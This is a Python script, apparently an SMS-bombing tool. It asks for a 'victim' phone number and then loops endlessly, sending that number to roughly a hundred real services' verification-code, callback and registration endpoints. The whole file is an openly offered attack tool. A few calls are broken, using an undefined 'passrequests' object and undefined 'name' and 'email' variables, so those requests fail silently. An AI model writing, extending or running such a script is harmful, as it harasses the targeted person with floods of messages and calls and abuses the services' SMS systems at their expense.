import requests, os

os.system("clear")

print()

print("""
╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱ """)

print()

nomer = int(input("Введи номер жертвы : +"))

os.system("clear")

print()

print("""
╱╱┏╮╱╱╱╱╱╱╱╱╱╱
╱╱┃┃╱╱┳╱┓┳╭┛┳┓
▉━╯┗━╮┃╱┃┣┻╮┣╱
▉┈┈┈┈┃┻┛┛┻╱┗┗┛
▉╮┈┈┈┃▔▔▔▔▔▔▔▔
╱╰━━━╯ """)

print()

print(F"Атака началась на : {nomer}")

print()

# 1
while True:

 try:
    a = requests.post("https://eda.yandex/api/v1/user/requests_authentication_code",json={"phone_number": nomer},)
    print(1)
 except:
    pass

#2

 try:
    a = requests.post("https://zoloto585.ru/api/bcard/reg/",json={"phone_number": nomer},)
    print(2)
 except:
    pass

#3

 try:
    a = requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": nomer},)
    print(3)
 except:
    pass

#4

 try:
    a = requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": nomer},)
    print(4)
 except:
    pass

#5

 try:
    a = requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": nomer},)
    print(5)
 except:
    pass

#6

 try:
    a = requests.post("https://ng-api.webbankir.com/user/v2/create",json={"mobilephone": nomer},)
    print(6)
 except:
    pass

#7

 try:
    a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",data={"phone": nomer},)
    print(7)
 except:
    pass

#8

 try:
    a = requests.post("https://b.utair.ru/api/v1/profile/",json={"phone": nomer},)
    print(8)
 except:
    pass

#9

 try:
    a = requests.post("https://b.utair.ru/api/v1/login/",json={"login": nomer,"confirmation_type":"call_code"},)
    print(9)
 except:
    pass

#10

 try: 
    a = requests.post("https://uklon.com.ua/api/v1/account/code/send",json={"phone": nomer},)
    print(10)
 except:
    pass

#11

 try:
    a = requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",json={"phone": nomer},)
    print(11)
 except:
    pass

#12

 try:
    a = requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": nomer},)
    print(12)
 except:
    pass

#13

 try:
    a = requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": nomer},)
    print(13)
 except:
    pass

#14

 try:
    a = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": nomer},)
    print(14)
 except:
    pass

#15

 try:
    a = requests.post("https://thehive.pro/auth/signup",json={"phone": nomer},)
    print(15)
 except:
    pass

#16

 try:
    a = requests.post("https://msk.tele2.ru/api/validation/number/",json={"sender": nomer},)
    print(16)
 except:
    pass

#17

 try:
    a = requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": nomer},)
    print(17)
 except:
    pass

#18

 try:
    a = requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": nomer},)
    print(18)
 except:
    pass

#19

 try:
    a = requests.post("https://lk.tabris.ru/reg/",data={"action": nomer},)
    print(19)
 except:
    pass

#20

 try:
    a = requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": nomer},)
    print(20)
 except:
    pass

#21

 try:
    a = requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": nomer},)
    print(21)
 except:
    pass

#22

 try:
    a = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": nomer},)
    print(22)
 except:
    pass

#23

 try:
    a = requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": nomer},)
    print(23)
 except:
    pass

#24

 try:
    a = requests.post("http://sushigourmet.ru/auth",data={"phone": nomer},)
    print(24)
 except:
    pass

#25

 try:
    a = requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": nomer},)
    print(25)
 except:
    pass

#26

 try:
    a = requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": nomer},)
    print(26)
 except:
    pass

#27

 try:
    a = requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": nomer},)
    print(27)
 except:
    pass

#28

 try:
    a = requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": nomer},)
    print(28)
 except:
    pass

#29

 try:
    a = requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": nomer},)
    print(29)
 except:
    pass

#30

 try:
    a = requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do",params={"phone": nomer},)
    print(30)
 except:
    pass

#31

 try:
    a = requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": nomer},)
    print(31)
 except:
    pass

#32

 try:
    a = requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": nomer},)
    print(32)
 except:
    pass
#33

 try:
    a = requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": nomer},)    
    print(33)
 except:
    pass

#34

 try:
    a = requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": nomer},)
    print(34)
 except:
    pass

#35

 try:
    a = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": nomer},)
    print(35)
 except:
    pass

#36

 try:
    a = requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": nomer},)
    print(36)
 except:
    pass

#37

 try:
    a = requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": nomer},)
    print(37)
 except:
    pass

#38

 try:
    a = requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": nomer},)
    print(38)
 except:
    pass

#39
 try:
    a = requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": nomer},)
    print(39)
 except:
    pass

#40

 try:
    a = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": nomer},)
    print(40)
 except:
    pass

#41

 try:
    a = requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": nomer, "mode": "sms"},)
    print(41)
 except:
    pass

#42

 try:
    a = requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": nomer}},)
    print(42)
 except:
    pass

#43

 try:
    a = requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": nomer},)
    print(43)
 except:
    pass

#44

 try:
    a = requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": nomer},)
    print(44)
 except:
    pass

#45

 try:
    a = requests.get("https://cabinet.planetakino.ua/service/sms",params={"phone": nomer},)
    print(45)
 except:
    pass

#46

 try:
    a = requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","phone": nomer},)
    print(46)
 except:
    pass

#47

 try:
    a = requests.post("https://pizzasinizza.ru/api/phoneCode.php",json={"phone": nomer},)
    print(47)
 except:
    pass

#48

 try:
    a = requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+nomer, "method": "sendCode"},)
    print(48)
 except:
    pass

#49

 try:
    a = requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": nomer},)
    print(49)
 except:
    pass

#50

 try:
    a = requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": nomer, "method": "sendCode"},)
    print(50)
 except:
    pass

#51

 try:
    a = requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": nomer},)
    print(51)
 except: 
    pass

#52

 try:
    a = requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": nomer},)
    print(52)
 except:
    pass

#53

 try:
    a = requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": nomer},)
    print(53)
 except:
    pass

#54

 try:
    a = requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": nomer},)
    print(54)
 except:
    pass

#55

 try:
    a = requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "RU","phone": nomer},)
    print(55)
 except:
    pass

#56

 try:
    a = requests.get("https://secure.online.ua/ajax/check_phone/",params={"reg_phone": nomer},)
    print(56)
 except:
    pass

#57

 try:
    a = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": nomer},)
    print(57)
 except:
    pass

#58

 try:
    a = requests.post("https://nn-card.ru/api/1.0/covid/login",json={"phone": nomer},)
    print(58)
 except:
    pass

#59

 try:
    a = requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": nomer,"code": "","sendsms": "Выслать код"},)
    print(59)
 except:
    pass

#60

 try:
    a = requests.post("https://account.my.games/signup_send_sms/",data={"phone": nomer},)
    print(60)
 except:
    pass

#61

 try:
    a = requests.post("https://auth.multiplex.ua/login",json={"login": nomer},)
    print(61)
 except:
    pass

#62

 try:
    a = requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": nomer},)
    print(62)
 except:
    pass

#63

 try:
    a = requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": nomer,"email": email},)
    print(63)
 except:
    pass

#64

 try:
    a = requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": nomer},)
    print(64)
 except:
    pass

#65

 try:
    a = requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": nomer},)
    print(65)
 except:
    pass

#66

 try:
    a = requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": nomer, "Package": "optimal"},)
    print(66)
 except:
    pass

#67

 try:
    a = requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": nomer},)
    print(67)
 except:
    pass

#68

 try:
    a = requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": nomer, "phone_number": "1"},)
    print(68)
 except:
    pass

#69

 try:
    a = requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": nomer, "do": "phone"},)
    print(69)
 except:
    pass

#70

 try:
    a = requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": nomer},)
    print(70)
 except:
    pass

#71

 try:
    a = requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": nomer, "metod": "postreg"},)
    print(71)
 except:
    pass

#72

 try:
    a = requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": nomer},)
    print(72)
 except:
    pass

#73

 try:
    a = requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone": nomer},)
    print(73)
 except:
    pass

#74

 try:
    a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": nomer},)
    print(74)
 except:
    pass

#75

 try:
    a = requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": nomer},)
    print(75)
 except:
    pass

#76

 try:
    a = requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",json={"phone": nomer},)
    print(76)
 except:
    pass

#77

 try:
    a = requests.post("https://kilovkusa.ru/ajax.php",data={"phone": nomer},)
    print(77)
 except:
    pass

#78

 try:
    a = requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": nomer},)
    print(78)
 except:
    pass

#79

 try:
    a = requests.post("https://kaspi.kz/util/send-app-link",data={"address": nomer},)
    print(79)
 except:
    pass

#80

 try:
    a = requests.post("https://app.karusel.ru/api/v1/phone/",data={"phone": nomer},)
    print(80)
 except:
    pass

#81

 try:
    a = requests.post("https://izi.ua/api/auth/sms-login",json={"phone": nomer},)
    print(81)
 except:
    pass

#82

 try:
    a = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": nomer},)
    print(82)
 except:
    pass

#83

 try:
    a = requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": nomer},)
    print(83)
 except:
    pass

#84

 try:
    a = requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": nomer, "region_code": "RU"},)
    print(84)
 except:
    pass

#85

 try:
    a = requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": nomer},},)
    print(85)
 except:
    pass

#86

 try:
    a = requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": nomer},)
    print(86)
 except:
    pass

#87

 try:
    a = passrequests.post("https://my.dianet.com.ua/send_sms/",data={"phone": nomer},)
    print(87)
 except:
    pass

#88

 try:
    a = passrequests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": nomer,"type": "register"},)
    print(88)
 except:
    pass

#89

 try:
    a = passrequests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": nomer},)
    print(89)
 except:
    pass

#90

 try:
    a = requests.post("https://cinema5.ru/api/phone_code",data={"phone": nomer},)
    print(90)
 except:
    pass

#91

 try:
    a = requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": nomer, "type": "authenticateCode"},)
    print(91)
 except:
    pass

#92

 try:
    a = requests.post("https://bluefin.moscow/auth/register/",data={"phone": nomer, "sendphone": "Далее"},)
    print(92)
 except:
    pass

#93

 try:
    a = requests.post("https://app.benzuber.ru/login",data={"phone": nomer},)
    print(93)
 except:
    pass

#94

 try:
    a = requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": nomer},)
    print(94)
 except:
    pass

#95

 try:
    a = requests.post("https://bamper.by/registration/?step=1",data={"phone": nomer,"submit": "Запросить смс подтверждения","rules": "on"},)
    print(95)
 except:
    pass

#96

 try:
    a = requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": nomer},)
    print(96)
 except:
    pass

#97

 try:
    a = requests.post("https://oauth.av.ru/check-phone",json={"phone": nomer},)
    print(97)
 except:
    pass

#98

 try:
    a = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": nomer},)
    print(98)
 except:
    pass

#99

 try:
    a = requests.post("https://belkacar.ru/get-confirmation-code",data={'phone': nomer},)
    print(99)
 except: 
    pass

#100

 try:
    a = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={'phone_number': nomer},)
    print(100)
 except:
    pass

#101

 try:
    a = requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": nomer},)
    print(101)
 except:
    pass

#102

 try:
    a = requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": nomer,"klient_email": email},)
    print(102)
 except:
    pass

input
